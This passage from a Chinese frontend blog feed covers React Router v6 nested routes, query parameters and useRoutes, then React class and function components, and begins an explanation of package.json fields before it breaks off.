<span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/messages/*&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Messages</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/settings&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Settings</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样做的确生效了，无论是导航到 <code>/messages</code> 还是 <code>/messages/:id</code>，都能正常加载消息列表组件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662987044950-aabc8a42-6885-45fe-b24f-0d0213351541.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662987044950-aabc8a42-6885-45fe-b24f-0d0213351541.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>通过将 <code>/*</code> 附加到 <code>/messages</code> 路径的末尾，实际上是在告诉 React Router，<code>Messages</code> 有一个嵌套的 <code>Routes</code> 组件。并且父路径应该匹配 <code>/messages</code> 以及与 <code>/messages/*</code> 匹配的任何其他路由。</p><p>当我们希望在子 <code>Route</code> 控制渲染嵌套路由时，这是有效的。但是如果我们希望在 <code>App</code> 组件包含创建嵌套路由所需的所有信息，而不是必须在 <code>Messages</code> 组件中定义呢？React Router 也是支持这种创建嵌套路由的方式：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/messages&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Messages</span> /&gt;</span>&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;:id&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">MessagesDetails</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/settings&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Settings</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这里以声明式的方式将子 <code>Route</code> 嵌套为父 <code>Route</code> 的子级。和上面一样，子路由是相对于父路由的，因此不需要包含父 (<code>/messages</code>) 路径。</p><p>现在，只需要告诉 React Router 应该在父路由（<code>Messges</code>）中的哪个位置渲染子路由（<code>MessagesDetails</code>）。这就就需要使用 React Router 的 <code>Outlet</code> 组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Outlet</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Messages</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Conversations</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Outlet</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />如果应用的路由与嵌套 Route 的路径匹配，<code>Outlet</code> 组件就会渲染 Route 的元素。 根据上面的 <code>Routes</code>，如果在当前的路由是 <code>/messages</code>，<code>Outlet</code> 组件将渲染为 <code>null</code>；如果当前的路由是<code> /messages/1</code>，<code>Outlet</code> 组件将渲染 <code>&lt;MessagesDetails /&gt;</code> 组件。</p><p><a name="SVVfA"></a></p><h2 id="7-查询参数"><a href="#7-查询参数" class="headerlink" title="7. 查询参数"></a>7. 查询参数</h2><p>在 React Router 中，如何从 URL 中获取参数呢？例如以下 URL：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twitter.<span class="property">com</span>/search?q=react&amp;src=typed_query&amp;f=live</span><br></pre></td></tr></table></figure><p><br />从 <strong>v6</strong> 开始，React Router 使用 <code>URLSearchParams API</code> 来处理查询字符串，<code>URLSearchParams</code> 内置于所有浏览器（IE 除外）中，并提供了处理查询字符串的实用方法。当创建 <code>URLSearchParams</code> 实例时，需要向它传递一个查询字符串：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> queryString = <span class="string">&quot;?q=react&amp;src=typed_query&amp;f=live&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> sp = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span><br><span class="line"></span><br><span class="line">sp.<span class="title function_">has</span>(<span class="string">&quot;q&quot;</span>); <span class="comment">// true</span></span><br><span class="line">sp.<span class="title function_">get</span>(<span class="string">&quot;q&quot;</span>); <span class="comment">// react</span></span><br><span class="line">sp.<span class="title function_">getAll</span>(<span class="string">&quot;src&quot;</span>); <span class="comment">// [&quot;typed_query&quot;]</span></span><br><span class="line">sp.<span class="title function_">get</span>(<span class="string">&quot;nope&quot;</span>); <span class="comment">// null</span></span><br><span class="line"></span><br><span class="line">sp.<span class="title function_">append</span>(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;ascending&quot;</span>);</span><br><span class="line">sp.<span class="title function_">toString</span>(); <span class="comment">// &quot;?q=react&amp;src=typed_query&amp;f=live&amp;sort=ascending&quot;</span></span><br><span class="line"></span><br><span class="line">sp.<span class="title function_">set</span>(<span class="string">&quot;q&quot;</span>, <span class="string">&quot;bytes.dev&quot;</span>);</span><br><span class="line">sp.<span class="title function_">toString</span>(); <span class="comment">// &quot;?q=bytes.dev&amp;src=typed_query&amp;f=live&amp;sort=ascending&quot;</span></span><br><span class="line"></span><br><span class="line">sp.<span class="title function_">delete</span>(<span class="string">&quot;sort&quot;</span>);</span><br><span class="line">sp.<span class="title function_">toString</span>(); <span class="comment">// &quot;?q=bytes.dev&amp;src=typed_query&amp;f=live&quot;</span></span><br></pre></td></tr></table></figure><p><br />React Router 提供了一个自定义的 <code>useSearchParams</code> Hook，它是基于 <code>URLSearchParams</code> 进行的封装。<code>useSearchParams</code> 返回一个数组，该数组第一个元素是 <code>URLSearchParams</code> 的实例，第二个元素是更新查询参数的一个方法。</p><p>对于上面的 URL，使用 <code>useSearchParams</code> 从查询字符串中获取值：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useSearchParams &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Results</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [searchParams, setSearchParams] = <span class="title function_">useSearchParams</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> q = searchParams.<span class="title function_">get</span>(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> src = searchParams.<span class="title function_">get</span>(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> f = searchParams.<span class="title function_">get</span>(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />如果需要更新查询字符串，可以使用 <code>setSearchParams</code>，向它传递一个对象，该对象的<code>key/value</code> 对将作为 <code>&amp;key=value</code> 添加到 <code>url</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Results</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [searchParams, setSearchParams] = <span class="title function_">useSearchParams</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> q = searchParams.<span class="title function_">get</span>(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> src = searchParams.<span class="title function_">get</span>(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> f = searchParams.<span class="title function_">get</span>(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">updateOrder</span> = (<span class="params">sort</span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setSearchParams</span>(&#123; sort &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    ...</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br /><a name="Kppdv"></a>## 8. Route 配置React Router **v6** 内置了一个 `useRoutes` Hook，它在功能上等同于 `<Routes>`，但它是使用 JavaScript 对象而不是 `<Route>` 元素来定义路由。这个对象具有与普通 `<Route>` 元素相同的属性，但它们不需要使用 `JSX` 来编写。<p><code>useRoutes</code> 的返回值要么是一个有效的 React 元素（可以使用它来渲染路由树），如果没有匹配项，则返回 <code>null</code>。</p><p>假如应用中有以下路径：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/</span><br><span class="line">/invoices</span><br><span class="line">  :id</span><br><span class="line">  pending</span><br><span class="line">  complete</span><br></pre></td></tr></table></figure><p><br />使用 <code>&lt;Route&gt;</code> 组件来定义路由将会是这样的：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Navbar</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/invoices&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Invoices</span> /&gt;</span>&#125;&gt;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;:id&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Invoice</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;pending&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Pending</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;complete&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Complete</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 <strong>useRoutes</strong> 是利用 JavaScript 对象完成的，而不是使用 React 元素 (<code>JSX</code>) 来声明路由。定义形式如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useRoutes &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = <span class="title function_">useRoutes</span>([</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>, <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Home</span> /&gt;</span></span> &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/invoices&quot;</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Invoices</span> /&gt;</span></span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123; <span class="attr">path</span>: <span class="string">&quot;:id&quot;</span>, <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Invoice</span> /&gt;</span></span> &#125;,</span><br><span class="line">      &#123; <span class="attr">path</span>: <span class="string">&quot;/pending&quot;</span>, <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Pending</span> /&gt;</span></span> &#125;,</span><br><span class="line">      &#123; <span class="attr">path</span>: <span class="string">&quot;/complete&quot;</span>, <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Complete</span> /&gt;</span></span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Navbar</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;routes&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 组件化开发</title>
      <link href="/2023/07/14/frontend/react/react-zu-jian-hua-kai-fa/"/>
      <url>/2023/07/14/frontend/react/react-zu-jian-hua-kai-fa/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="hWu9S"></a></p><h2 id="一、什么是组件化"><a href="#一、什么是组件化" class="headerlink" title="一、什么是组件化"></a>一、什么是组件化</h2><p>在处理一个复杂的问题时，我们逻辑思维能力是有限的，不太可能一次性搞定所有的内容，那我们就可以对问题进行拆解，拆解成一个个小的问题，最后将其放入整体中，这就是分治的思想。</p><p>分而治之是软件工程的重要思想，是复杂系统开发和维护的基石，而前端目前的模块化和组件化都是基于分而治之的思想。</p><p>如果我们将一个页面的所有的处理逻辑都放在一起，那处理起来就会非常繁杂，并且也不利于后续的管理以及扩展。我们可以将页面拆分成一个个小的功能模块，每个功能模块完成属于这部分独立的功能，这样之后整个页面的管理和维护变得很容易了。</p><p>我们需要通过组件化的思想来思考整个应用程序：<br />● 将一个完整的页面分成很多个组件；<br />● 每个组件都用于实现页面的一个功能块；<br />● 每一个组件又可以进行细分；<br />● 组件本身又可以在多个地方进行复用；</p><p><a name="jbfWm"></a></p><h2 id="二、React-组件化"><a href="#二、React-组件化" class="headerlink" title="二、React 组件化"></a>二、React 组件化</h2><p>组件化是 React 是核心思想，React 的组件相对于 Vue 更加灵活和多样，按照不同的方式可以分成很多类组件：<br />● 根据组件的定义方式，可以分为：**函数组件(Functional Component )<strong>和</strong>类组件(Class Component)<strong>； <br />● 根据组件内部是否有状态需要维护，可以分成：</strong>无状态组件(Stateless Component )<strong>和</strong>有状态组件(Stateful Component)<strong>； <br />● 根据组件的不同职责，可以分成：</strong>展示型组件(Presentational Component)<strong>和</strong>容器型组件(Container Component)**；</p><p>这些概念有很多重叠，但是它们最主要是关注数据逻辑和 UI 展示的分离： <br />● 函数组件、无状态组件、展示型组件主要关注 UI 的展示； <br />● 类组件、有状态组件、容器型组件主要关注数据逻辑；<br />当然还有很多组件的其他概念：比如异步组件、高阶组件等</p><p><a name="v1h6d"></a></p><h3 id="1-类组件"><a href="#1-类组件" class="headerlink" title="1. 类组件"></a>1. 类组件</h3><p>类组件的定义有如下要求： <br />● 组件的名称是大写字符开头（无论类组件还是函数组件） <br />● 类组件需要继承自 <code>React.Component</code><br />● 类组件必须实现<code>render</code>函数</p><p>在 ES6 之前，可以通过<code>create-react-class</code> 模块来定义类组件，但是目前官网建议我们使用<code>ES6</code>的<code>class</code>类定义。</p><p><a name="tMYRH"></a></p><h4 id="类组件定义"><a href="#类组件定义" class="headerlink" title="类组件定义"></a>类组件定义</h4><p>使用<code>class</code>定义一个组件：<br />● <code>constructor</code>是可选的，我们通常在<code>constructor</code>中初始化一些数据；<br />● <code>this.state</code>中维护的就是我们组件内部的数据；<br />● <code> render()</code> 方法是 <code>class</code> 组件中唯一必须实现的方法；</p><p><a name="KMs5G"></a></p><h4 id="类组件特点"><a href="#类组件特点" class="headerlink" title="类组件特点"></a>类组件特点</h4><ol><li>状态 <code>state</code> 是在 <code>constructor</code> 中初始化的； <br />2. 成员函数不会自动绑定 <code>this</code>，需要开发者手动绑定，否则 <code>this</code> 不能获取当前组件实例对象。React 中可以用以下三种方法手动绑定 <code>this</code> ： <br />● 可以在构造函数中完成绑定； <br />● 可以在调用时使用 <code>method.bind(this)</code> 来完成绑定； <br />● 可以使用箭头函数来绑定。</li></ol><p>通过 <code>state</code> 的变化，组件的 UI 也会随之重新渲染，因此我们不能把所有变量都放到 <code>state</code> 中，不然会造成一定的性能损耗。**以下情况都不应该作为一个状态放到 <strong><code>**state**</code></strong> 中： **<br />● 如果是通过 <code>props</code> 获取； <br />● 如果该变量不在 <code>render</code> 中使用； <br />● 如果整个过程中都不会发生变化； <br />● 如果该变量可以通过 <code>state</code> 和 <code>props</code> 两者计算得出。</p><p><a name="nojjL"></a></p><h3 id="2-函数组件"><a href="#2-函数组件" class="headerlink" title="2. 函数组件"></a>2. 函数组件</h3><p>函数组件是使用<code>function</code>来进行定义的函数，只是这个函数会返回和类组件中<code>render</code>函数返回一样的内容。</p><p>函数组件有自己的特点： <br />● 没有生命周期，也会被更新并挂载，但是没有生命周期函数<br />● 没有<code>this</code>(组件实例）<br />● 没有内部状态（<code>state</code>）</p><p>函数式创建的组件代码简洁，专注于 render，且组件不需要被实例化，整体渲染性能得到了提升，且视图和数据解耦分离，输出只取决于输入。但是，它无法拥有自己的 <code>state</code>，只能通过 <code>props</code> 获取属性内容并实现组件的更新，无生命周期。</p><p>下面来定义一个函数组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">return</span>(</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">      ）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说完这两种组件，我们来看一下<code>render</code>函数的返回值。当 <code>render</code> 被调用时，它会检查 <code>this.props</code> 和 <code>this.state</code> 的变化并返回以下类型之一：<br />**（1） React 元素： **通常通过 JSX 创建。 例如：<code>&lt;div /&gt;</code> 会被 React 渲染为 DOM 节点，<code>&lt;MyComponent /&gt;</code> 会被 React 渲染为自定义组件。 <code>&lt;div /&gt;</code> 和 <code>&lt;MyComponent /&gt;</code> 都是 React 元素。 <br /><strong>（2）数组或 fragments</strong>：使得 render 方法可以返回多个元素。 <br /><strong>（3）Portals</strong>：可以渲染子节点到不同的 DOM 子树中。<br /><strong>（4）字符串或数值类型</strong>：它们在 DOM 中会被渲染为文本节点 <br /><strong>（5）布尔类型或 null</strong>：什么都不渲染。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>package.json</title>
      <link href="/2023/07/13/frontend/engineering/package.json/"/>
      <url>/2023/07/13/frontend/engineering/package.json/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>在每个前端项目中，都有 package.json 文件，它是项目的配置文件，常见的配置有配置项目启动、打包命令，声明依赖包等。package.json 文件是一个 JSON 对象，该对象的每一个成员就是当前项目的一项设置。package.json 作为前端的大管家，到底有哪些配置和我们的日常开发密切相关？下面就来仔细剖析一下这个文件。</p><p>当我们搭建一个新项目时，往往脚手架就帮我们初始化好了一个 package.jaon 配置文件，它位于项目的根目录中。当使用 react 脚手架（create-react-app）初始化一个项目时，其 package.json 文件内容如下：<br />当我们克隆一个新的项目到本地时，需要执行 npm install（yarn install）命令来安装项目所需的依赖文件。当执行该命令时，就会根据 package.json 文件中的配置信息来自动下载所需的模块，也就是配置项目所需的运行和开发环境。</p><p>package.json 常见配置项如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;my-app&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.1.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@testing-library/jest-dom&quot;</span>: <span class="string">&quot;^5.14.1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@testing-library/react&quot;</span>: <span class="string">&quot;^11.2.7&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@testing-library/user-event&quot;</span>: <span class="string">&quot;^12.8.3&quot;</span>,</span><br><span class="line">      <span class="string">&quot;react&quot;</span>: <span class="string">&quot;^17.0.2&quot;</span>,</span><br><span class="line">      <span class="string">&quot;react-dom&quot;</span>: <span class="string">&quot;^17.0.2&quot;</span>,</span><br><span class="line">      <span class="string">&quot;react-scripts&quot;</span>: <span class="string">&quot;4.0.3&quot;</span>,</span><br><span class="line">      <span class="string">&quot;web-vitals&quot;</span>: <span class="string">&quot;^1.1.2&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;react-scripts start&quot;</span>,</span><br><span class="line">      <span class="string">&quot;build&quot;</span>: <span class="string">&quot;react-scripts build&quot;</span>,</span><br><span class="line">      <span 